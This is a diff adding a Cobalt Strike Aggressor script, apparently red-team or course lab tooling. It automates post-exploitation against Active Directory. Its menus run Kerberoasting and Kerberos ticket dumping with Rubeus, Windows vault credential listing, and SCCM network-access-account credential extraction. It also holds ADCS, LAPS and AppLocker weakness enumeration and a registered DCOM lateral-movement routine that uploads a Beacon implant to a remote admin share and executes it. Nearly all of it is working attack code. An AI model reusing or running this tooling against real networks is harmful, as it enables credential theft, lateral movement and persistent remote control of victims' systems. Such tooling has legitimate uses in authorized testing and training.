@@ -1,0 +1,319 @@
+on beacon_initial {
+	# set sleep time
+	bsleep($1, 20, 30);
+}
+
+global("@DC, $TopDomain, $SubDomain1, $SubDomain2, $OtherDomain1, $OtherDomain2, $DomainSID");
+
+$TopDomain = '';
+$DomainSID = '';
+@DC = @('');
+$SubDomain1 = '';
+$SubDomain2 = '';
+$OtherDomain1 = '';
+$OtherDomain2 = '';
+
+alias AutoSetGlobalVars {
+	bpowershell_import($1, script_resource('PowerSploit\Recon\PowerView.ps1'));
+	$TopDomain = bpowerpick($1, "Get-Domain | select-object -ExpandProperty Name");
+	$DomainSID = bpowerpick($1, "Get-DomainSID");
+	@DC = bpowerpick($1, 'Get-DomainController | select-object -ExpandProperty Name');
+	bpowershell_import($1, script_resource('PowerUpSQL\PowerUpSQL.ps1'));
+	@SqlPc = bpowerpick($1, 'Get-SQLInstanceDomain | select-object -ExpandProperty ComputerName');
+}
+
+alias CreateTicket {
+# Shortcut for Rubeus createnetonly func
+
+# $2 = Program ; $3 = Domain ; $4 Username ; $5 Ticket ;
+
+	local("$Program, $Domain, $Username, $Ticket");
+	if ($2 eq "notepad") {
+		$Program = 'C:\Windows\System32\notepad.exe';}
+	else if ($2 eq "cmd") {
+		$Program = 'C:\Windows\System32\cmd.exe';}
+	else {
+		$Program = $2;}
+	$Domain = $3;
+	$Username = $4;
+	$Ticket = $5;
+
+	bexecute_assembly($1, script_resource('\Rubeus\Rubeus\bin\Release\Rubeus.exe'), "createnetonly /program:$Program /domain:$Domain /username:$Username /password:Passw0rd123 /ptt /ticket:$Ticket");
+}
+
+alias DumpTicket {
+
+	local("$luid, $service");
+	$luid = $2;
+	$service = $3;
+
+	bexecute_assembly($1, script_resource('\Rubeus\Rubeus\bin\Release\Rubeus.exe'), "dump /luid:$luid /service:$service /nowrap");
+}
+
+alias UploadAndRemoteExec {
+
+	local("$TargetPC, $Implant, $Listerner");
+	$TargetPC = $2;
+	$Implant = $3;
+	$Listerner = "";
+# #	$payload = artifact_payload($Implant, "exe", "x64");
+
+# #	bupload_raw($1, "\\\\$TargetPC\\ADMIN$\\Temp", $payload);
+	blog($1, "cd \\\\$TargetPC\\ADMIN$");
+	blog($1, "upload C:\\Payloads\\$Implant");
+	blog($1, "remote-exec wmi $TargetPC C:\\Windows\\Temp\\$Implant");
+	blog($1, "link $TargetPC $Listener");
+}
+
+popup beacon_bottom {
+# Import PowerView
+	item 'Import PowerView' {
+		bpowershell_import($1, script_resource('PowerSploit\Recon\PowerView.ps1'));
+	}
+
+# Used For General Domain Recon; Find Non Specific info About the Domain.
+	menu 'DomainRecon' {
+		item 'Get Domain' {
+			# Get Domain T1482
+			bpowerpick($1, 'Get-Domain');
+		}
+		item 'Get Domain Forest' {
+			# Get Domain Forest T1482
+			bpowerpick($1, 'Get-ForestDomain');
+		}
+		item 'Get Domain Computers' {
+			# Get Domain Computers
+			bpowerpick($1, 'Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostNamer');
+		}
+		item 'Get Domain OU' {
+			# Get Domain OU
+			bpowerpick($1, 'Get-DomainOU -Properties Name | sort -Property Name');
+		}
+		item 'Get all Domain Groups' {
+			# Get all Domain Groups T1069
+			bpowerpick($1, 'Get-DomainGroup | select admincount , cn , samaccountname , objectsid , distinguishedname , member , objectguid , objectcategory | fl');
+		}
+		item 'Get All Domain Groups (Group + Member ONLY)' {
+			bpowerpick($1, 'Get-DomainGroup | select cn ,member, samaccountname | fl');
+		}
+		item 'Find Users and their Groups' {
+			bpowerpick($1, 'Get-DomainUser | select cn, memberof, samaccountname | fl');
+		}
+		item 'Get-DomainGPOUserLocalGroupMapping' {
+			bpowerpick($1, 'Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl');
+		}
+	}
+
+# Used to find Info Specific to the Domain User/Group.
+	menu 'DomainEnum' {
+		item 'Get All Local Users' {
+			bpowerpick($1, 'Get-NetLocalGroup');
+		}
+		item 'Get Shares' {
+			bpowerpick($1, 'Get-NetShare');
+		}
+		item 'Find Computers Local Group can access' {
+			FindCom($1);
+		} 
+		item 'Get Local Kerberos Tickets' {
+			bexecute_assembly($1, script_resource('\Rubeus\Rubeus\bin\Release\Rubeus.exe'), 'triage');
+		}
+	}
+
+# Used to find Info on Local Computer
+	menu 'LocalEnum' {
+		item 'List Processes' {
+			bps($1);
+		}
+		item 'Find Unquoted Services' {
+			brun($1, "wmic service get name, pathname");
+		}
+		item 'Find Modifiable Services' {
+			bexecute_assembly($1, script_resource('\SharpUp\SharpUp\bin\Release\SharpUp.exe'), 'audit ModifiableServices');
+		}
+		item 'List Network IO' {
+			bipconfig($1, {
+				blog($1, "\n Network information is:\t $+ $2");
+			});
+		}
+		item 'List Local Users' {
+			bnet($1, "sessions", $null);
+		}
+		menu 'DPAPI' {
+			item 'List DPAPI Vault' {
+				bexecute_assembly($1, script_resource('\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe'), 'WindowsVault');
+			}
+			item 'vaultcmd /list' {
+				brun($1, 'vaultcmd /list');
+			}
+			item 'vaultcmd /listcreds Windows Credentials' {
+				brun($1, 'vaultcmd /listcreds:"Windows Credentials" /all');
+			}
+		}
+	}
+
+# Used to enumerate vulnerabilities.
+	menu 'Vuln_Enum' {
+		menu 'Kerberos_vulns' {
+			item 'Kerberoast' {
+				bexecute_assembly($1, script_resource('\Rubeus\Rubeus\bin\Release\Rubeus.exe'), 'kerberoast /simple /nowrap');
+			}
+			item 'ASREProast' {
+				bexecute_assembly($1, script_resource('\ADSearch\ADSearch\bin\Release\ADSearch.exe'), '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
+			}
+			item 'KUD' {
+				bexecute_assembly($1, script_resource('\ADSearch\ADSearch\bin\Release\ADSearch.exe'), '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname');
+			}
+			item 'KCD' {
+				bexecute_assembly($1, script_resource('\ADSearch\ADSearch\bin\Release\ADSearch.exe'), '--search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json');
+			}
+			item 'RBCD' {
+				bpowerpick($1, 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$DomainSID-[\d]{4,10}" }');
+			} 
+		}
+		menu 'ADCS_vulns' {
+			item 'Cas' {
+				bexecute_assembly($1, script_resource('\Certify\Certify\bin\Release\Certify.exe'), 'cas');
+			}
+			item 'Find Vulnerable' {
+				bexecute_assembly($1, script_resource('\Certify\Certify\bin\Release\Certify.exe'), 'find /vulnerable');
+			}
+		}
+		menu 'GPO_vulns' {
+			item 'Mofifiable GPO' {
+				bpowerpick($1, 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "$DomainSID-[\d]{4,10}" }');
+			}
+			item 'Create Link GPO' {
+# #				bpowerpick($1, 'Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }');
+# #				blog($1, 'Can't automate. Change the DC DC DC youself in Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=citobrebyc,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }');
+				blog($1, "Bro does not want to work. check code");
+			}
+		}
+		menu 'MSSQL_recon' {
+			item 'Import PowerUpSQL' {
+				bpowershell_import($1, script_resource('PowerUpSQL\PowerUpSQL.ps1'));
+			}
+			item 'Get-SqlInstanceDomain' {
+				bpowerpick($1, 'Get-SQLInstanceDomain');
+			}
+			item 'SQL Server Instance Info' {
+				bpowerpick($1, 'Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo');
+			}
+			item 'Collect info on SQL Service and Acc' {
+				bpowerpick($1, 'Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo');
+			}
+			item 'Find group with access to MSSQL' {
+				bpowerpick($1, 'Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }');
+			}
+		}
+		menu 'SCCM_vulns' {
+			menu 'SCCM enum' {
+				item 'Local Site-Info' {
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), 'local site-info --no-banner');
+				}
+				item 'Find Management Point' {
+					bpowerpick($1, 'Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl');
+				}
+				item 'Find System management Container' {
+					blog($1, "Check the domain!!!");
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), "get site-info -d $TopDomain --no-banner");
+				}
+				item 'Find group/user permissions' {
+					blog($1, "Make sure enumerate with all USERS --- certain groups can impact what you see --- Like Read-Only Analyst");
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), "get collections --no-banner");
+				}
+				item 'Find Administrative Users' {
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), "get class-instances SMS_Admin --no-banner");
+				}
+				item 'Find all members' {
+					blog($1, "Check the domain!!!");
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), "get collection-members -n $TopDomain --no-banner");
+				}
+				item 'Get ComObj' {
+					blog($1, "Change the name of the PC!!!!");
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), "get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner");
+				}
+				item 'Show user last logon Pc' {
+					local("@AllUsers, $User");
+					
+					bpowerpick($1, 'get-domainuser | select-object -expandproperty samaccountname');
+					
+					@AllUsers = @('');
+					
+					blog($1, "Change the name of the User!!!!!!");
+					blog($1, @AllUsers);
+					foreach $User (@AllUsers) {
+						bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), "get devices -u $User -p IPAddresses -p IPSubnets -p Name --no-banner");
+					}
+				}
+			}
+			menu 'Network Access Account enum' {
+				item 'Local naa -m wmi' {
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), 'local naa -m wmi --no-banner');
+				}
+				item 'Local naa -m disk' {
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), 'local naa -m disk --no-banner');
+				}
+				item 'Local get naa' {
+					bexecute_assembly($1, script_resource('\SharpSCCM\bin\Release\SharpSCCM.exe'), 'get naa --no-banner');
+				}
+			}
+		}
+		menu 'LAPS' {
+			item 'Check AdmPwd.dll on system' {
+				brun($1, "ls C:\Program Files\LAPS\CSE");
+			}
+			item 'Check GPO with LAPS' {
+				bpowerpick($1, 'Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl');
+			}
+			item 'check ms-Mcs-AdmPwdExpirationTime' {
+				bpowerpick($1, 'Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName');
+			}
+		}
+		menu 'Application Whitelisting' {
+			item 'Find GPO of Machine with AW' {
+				bpowerpick($1, 'Get-DomainGPO -Domain $TopDomain | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath');
+				blog($1, "make sure you choose the right domain");
+			}
+			item 'Find AW from Registry.pol' {
+				bpowerpick($1, 'Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"');
+			}
+			item 'Check Language permitted by applocker' {
+				bpowerpick($1, '$ExecutionContext.SessionState.LanguageMode');
+			}
+			item 'Find Writeable path' {
+				bpowerpick($1, 'Get-Acl C:\Windows\Tasks | fl');
+			}
+		}
+	}
+}
+
+sub invoke_dcom
+{
+	local('$handle $script $oneliner $payload');
+
+# acknowledge this command1
+	btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
+
+# read in the script
+	$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
+	$script = readb($handle, -1);
+	closef($handle);
+
+# host the script in Beacon
+	$oneliner = beacon_host_script($1, $script);
+
+# generate stageless payload
+	$payload = artifact_payload($3, "exe", "x64");
+
+# upload to the target
+	bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
+
+# run via powerpick
+	bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
+
+# link if p2p beacon
+	beacon_link($1, $2, $3);
+}
+
+beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
